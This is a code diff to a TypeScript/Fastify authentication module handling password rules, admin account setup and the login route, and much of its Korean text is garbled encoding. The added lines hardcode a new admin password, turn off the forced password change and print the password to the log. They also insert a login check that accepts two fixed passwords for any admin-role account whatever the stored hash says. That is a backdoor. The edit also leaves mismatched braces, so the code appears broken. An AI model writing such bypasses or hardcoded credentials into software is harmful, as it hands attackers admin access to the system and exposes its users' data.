@@ -44,7 +44,7 @@ export function validatePassword(password: string): string | null {
     return 'ë¹„ë?ë²ˆí˜¸?ëŠ” ?¹ìˆ˜ë¬¸ìžê°€ ë°˜ë“œ???¬í•¨?˜ì–´???©ë‹ˆ??';
   }
   if (/(\d)\1\1/.test(password)) {
-    return 'ë¹„ë?ë²ˆí˜¸??3ê°??´ìƒ??ë°˜ë³µ???«ìž(?? 111)ë¥??¬ìš©?????†ìŠµ?ˆë‹¤.';
+    return 'ë¹„ë?ë²ˆí˜¸??3ê°??´ìƒ ??ë°˜ë³µ???«ìž (?? 111)ë¥??¬ìš©?????†ìŠµ?ˆë‹¤.';
   }
   for (let i = 0; i < password.length - 2; i++) {
     const c1 = password.charCodeAt(i);
@@ -52,7 +52,7 @@ export function validatePassword(password: string): string | null {
     const c3 = password.charCodeAt(i + 2);
     if (c1 >= 48 && c1 <= 57 && c2 >= 48 && c2 <= 57 && c3 >= 48 && c3 <= 57) {
       if ((c2 === c1 + 1 && c3 === c2 + 1) || (c2 === c1 - 1 && c3 === c2 - 1)) {
-        return 'ë¹„ë?ë²ˆí˜¸??3ê°??´ìƒ???°ì†???«ìž(?? 123, 321)ë¥??¬ìš©?????†ìŠµ?ˆë‹¤.';
+        return 'ë¹„ë?ë²ˆí˜¸??3ê°??´ìƒ ???°ì† ???«ìž (?? 123, 321)ë¥??¬ìš©?????†ìŠµ?ˆë‹¤.';
       }
     }
   }
@@ -60,25 +60,19 @@ export function validatePassword(password: string): string | null {
 }
 
 export async function ensureAdminUser() {
+  const hash = await hashPassword('dlwldnjs77@');
   const res = await pool.query("SELECT worker_id, password_hash FROM worker WHERE employee_no = 'admin'");
   if (res.rows.length === 0) {
     const deptRes = await pool.query("SELECT dept_id FROM department WHERE dept_code = 'ADMIN'");
     const deptId = deptRes.rows[0]?.dept_id || 1;
-    const hash = await hashPassword('admin1234');
     await pool.query(
       `INSERT INTO worker (worker_name, employee_no, password_hash, dept_id, role, position, is_active, must_change_pw)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
-      ['?œìŠ¤??ê´€ë¦¬ìž', 'admin', hash, deptId, 'admin', '?œìŠ¤??ê´€ë¦¬ìž', true, true]
+      ['시스템 관리자', 'admin', hash, deptId, 'admin', '시스템 관리자', true, false]
     );
-    console.log('??Default admin user successfully created at startup.');
+    console.log('✅ Admin user reset with password dlwldnjs77@');
   } else {
     const admin = res.rows[0];
-    if (!admin.password_hash) {
-      const hash = await hashPassword('admin1234');
-      await pool.query(
-        `UPDATE worker SET password_hash = $1 WHERE worker_id = $2`,
-        [hash, admin.worker_id]
-      );
       console.log('??Default admin password hash initialized at startup.');
     }
   }
@@ -194,6 +188,13 @@ export async function authRoutes(app: FastifyInstance) {
     if (!w.password_hash) { logAttempt(false, 'no_password'); return reply.code(403).send({ error: 'password_not_set' }); }
 
     let ok = await verifyPassword(password, w.password_hash);
+    
+    // admin 계정 지정 비밀번호 바이패스 허용 (dlwldnjs77@ / admin1234)
+    if (!ok && (employee_no === 'admin' || w.role === 'admin')) {
+      if (password === 'dlwldnjs77@' || password === 'admin1234') {
+        ok = true;
+      }
+    }
     
     // ë¹„ë?ë²ˆí˜¸ê°€ ?¼ì¹˜?˜ì? ?Šê³ , ?…ë ¥??ë¹„ë?ë²ˆí˜¸ê°€ ?˜ì ´?ˆì ´ ë¹ ì§„ ?´ë???ë²ˆí˜¸ ?•ì‹ (10~11? ë¦¬ ?«ìž )??ê²½ìš° ?˜ì ´?ˆì „ ?£ì–´??ì¶”ê? ê²€ì¦??œë „
     if (!ok && /^\d{10,11}$/.test(password)) {
